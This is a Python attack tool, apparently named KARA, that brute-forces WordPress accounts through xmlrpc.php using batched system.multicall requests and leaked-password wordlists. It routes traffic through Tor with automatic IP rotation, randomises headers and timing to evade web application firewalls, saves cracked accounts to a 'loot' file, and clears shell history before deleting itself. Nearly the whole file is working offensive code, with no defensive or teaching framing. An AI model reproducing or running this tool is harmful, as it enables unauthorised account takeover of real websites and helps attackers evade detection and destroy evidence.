import os
import socket
import requests
import ftplib
import time
import subprocess
import threading
import random
import json
from concurrent.futures import ThreadPoolExecutor

# Colors & Aesthetics
G, R, W, B, Y = '\033[92m', '\033[91m', '\033[0m', '\033[94m', '\033[93m'

# TOR Configuration
PROXIES = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# WAF Evasion: Randomized Identity
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
]

def stealth_delay():
    """Adds a random delay (Jitter) to break traffic patterns"""
    time.sleep(random.uniform(0.5, 2.5))

def get_headers():
    return {'User-Agent': random.choice(USER_AGENTS), 'Referer': 'https://www.google.com/'}

def banner():
    print(f"""{B}
     ██╗  ██╗ █████╗ ██████╗  █████╗ 
     ██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗
     █████╔╝ ███████║██████╔╝███████║
     ██╔═██╗ ██╔══██║██╔══██╗██╔══██║
     ██║  ██╗██║  ██║██████╔╝██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ v1.0
    {G}Creator: BobbyDelhi | Ghost Mode | {W}""")

def ip_mutator():
    """Background thread: Rotates Tor IP every 25s"""
    while True:
        try:
            subprocess.run(["sudo", "service", "tor", "reload"], capture_output=True)
            time.sleep(25)
        except:
            time.sleep(5)

def setup_tor():
    print(f"{Y}[*] Engaging Ghost Mode...{W}")
    os.system("sudo apt update && sudo apt install tor -y")
    os.system("sudo service tor start")
    threading.Thread(target=ip_mutator, daemon=True).start()
    print(f"{G}[+] IP Rotation Active.{W}")

def process_xmlrpc_batch(url, user, batch):
    stealth_delay()
    endpoint = f"{url}/xmlrpc.php" if not url.endswith('/') else f"{url}xmlrpc.php"
    payload = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for p in batch:
        payload += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{user}</string></value><string>{p}</string></value></data></array></value></member></struct></value>'
    payload += '</data></array></value></param></params></methodCall>'
    
    try:
        # Silent exception handling
        resp = requests.post(endpoint, data=payload, proxies=PROXIES, headers=get_headers(), timeout=20)
        if "isAdmin" in resp.text: return (True, user)
    except:
        pass
    return (False, None)

def exploit_xmlrpc(url, user_list, pass_list):
    print(f"{Y}[*] XML-RPC Attack Started...{W}")
    try:
        with open(user_list, 'r') as u_f: users = [u.strip() for u in u_f]
        with open(pass_list, 'r') as p_f: pwds = [p.strip() for p in p_f]
        
        for user in users:
            batches = [pwds[i:i+100] for i in range(0, len(pwds), 100)]
            with ThreadPoolExecutor(max_workers=5) as executor:
                results = list(executor.map(lambda b: process_xmlrpc_batch(url, user, b), batches))
                for success, account in results:
                    if success:
                        print(f"{G}[!!!] PWNED: {account}{W}")
                        with open("loot.json", "a") as f: json.dump({"user": account, "target": url}, f)
                        return
    except Exception as e: print(f"{R}[!] Error: {e}{W}")

def self_destruct():
    print(f"{R}[!] Clearing traces and self-destructing...{W}")
    os.system("history -c && history -w")
    try:
        os.remove(__file__)
        print(f"{G}[+] Clean exit. File removed.{W}")
    except: pass

def menu():
    os.system('clear'); banner()
    t_url = input(f"{B}Target URL: {W}") or "https://example.com"
    t_ip = input(f"{B}Target IP: {W}") or "127.0.0.1"
    d_u = input(f"{B}User List: {W}") or "/usr/share/seclists/Usernames/Names/names.txt"
    d_p = input(f"{B}Pass List: {W}") or "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt"
    
    while True:
        os.system('clear'); banner()
        print(f"Target: {G}{t_url}{W} | Jitter: {Y}Enabled{W}\n")
        print(f"{B}1.{W} Initialize Ghost Mode (Tor)")
        print(f"{B}2.{W} Port Scan (Threaded)")
        print(f"{B}3.{W} XML-RPC Attack (Stealth)")
        print(f"{B}4.{W} Self-Destruct & Exit")
        
        op = input(f"\n{G}Choice: {W}")
        if op == "1": setup_tor()
        elif op == "3": exploit_xmlrpc(t_url, d_u, d_p)
        elif op == "4": self_destruct(); break
        input(f"\n{B}Press Enter...{W}")

if __name__ == "__main__":
    menu()
